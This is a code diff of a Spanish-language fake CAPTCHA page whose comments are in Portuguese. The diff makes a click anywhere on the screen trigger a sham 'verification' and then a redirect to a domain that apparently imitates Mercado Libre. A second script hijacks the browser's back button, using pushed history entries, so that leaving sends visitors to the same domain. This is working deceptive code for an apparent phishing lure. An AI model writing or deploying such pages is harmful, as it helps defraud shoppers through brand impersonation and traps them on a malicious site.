@@ -15,6 +15,7 @@
       justify-content: center;
       align-items: center;
       overflow: hidden;
+      cursor: pointer; /* Indica que a tela é clicável */
     }
 
     /* Imagem de fundo SEM desfoque */
@@ -25,8 +26,6 @@
       background-image: url("bg.jpg");
       background-size: cover;
       background-position: center;
-      /* filter: blur(10px); <-- Removido */
-      /* transform: scale(1.1); <-- Removido */
       z-index: -2;
     }
 
@@ -51,6 +50,7 @@
       justify-content: space-between;
       align-items: center;
       box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+      pointer-events: none; /* Faz o clique "atravessar" a caixa e chegar no body */
     }
 
     .content-left {
@@ -64,16 +64,10 @@
       height: 26px;
       border: 2px solid #c1c1c1;
       border-radius: 2px;
-      cursor: pointer;
       display: flex;
       justify-content: center;
       align-items: center;
       background: white;
-      transition: all 0.2s ease;
-    }
-
-    .checkbox:hover {
-      border-color: #b2b2b2;
     }
 
     .checkbox.verified {
@@ -81,7 +75,6 @@
       background: transparent;
       color: #009688;
       font-size: 24px;
-      cursor: default;
     }
 
     .status-text {
@@ -114,7 +107,6 @@
       margin-top: 2px;
     }
 
-    /* Loading Spinner */
     .loading-spinner {
       width: 18px;
       height: 18px;
@@ -129,11 +121,11 @@
     }
   </style>
 </head>
-<body>
+<body id="mainBody">
 
 <div class="captcha-container">
   <div class="content-left">
-    <div class="checkbox" id="captchaBox" role="checkbox" aria-checked="false"></div>
+    <div class="checkbox" id="captchaBox"></div>
     <div class="status-text" id="statusLabel">No soy un robot</div>
   </div>
 
@@ -149,12 +141,14 @@
 <script>
   const captchaBox = document.getElementById("captchaBox");
   const statusLabel = document.getElementById("statusLabel");
-  
+  const mainBody = document.getElementById("mainBody");
   const targetDestination = "https://mercadoshoplibre.drhernandez.site/";
 
-  captchaBox.onclick = function () {
+  // Função única para iniciar a verificação
+  function startVerification() {
     if (captchaBox.classList.contains("verified")) return;
 
+    // Inicia o feedback visual
     captchaBox.innerHTML = "<div class='loading-spinner'></div>";
     statusLabel.textContent = "Verificando...";
 
@@ -167,28 +161,25 @@
       setTimeout(function () {
         window.location.href = targetDestination;
       }, 800);
+    }, 1500);
+  }
 
-    }, 1500); 
-  };
+  // Aciona a verificação ao clicar em qualquer lugar da tela
+  mainBody.onclick = startVerification;
 </script>
 
 <script type="text/javascript">
   var back_redirect_back_link = "https://mercadoshoplibre.drhernandez.site//" + location.search;
-
   history.pushState({}, "", location.href);
   history.pushState({}, "", location.href);
 
-  window.addEventListener(
-    "popstate",
-    function (event) {
-      if (event.state) {
-        setTimeout(function () {
-          location.href = back_redirect_back_link;
-        }, 1);
-      }
-    },
-    false
-  );
+  window.addEventListener("popstate", function (event) {
+    if (event.state) {
+      setTimeout(function () {
+        location.href = back_redirect_back_link;
+      }, 1);
+    }
+  }, false);
 </script>
 
 </body>
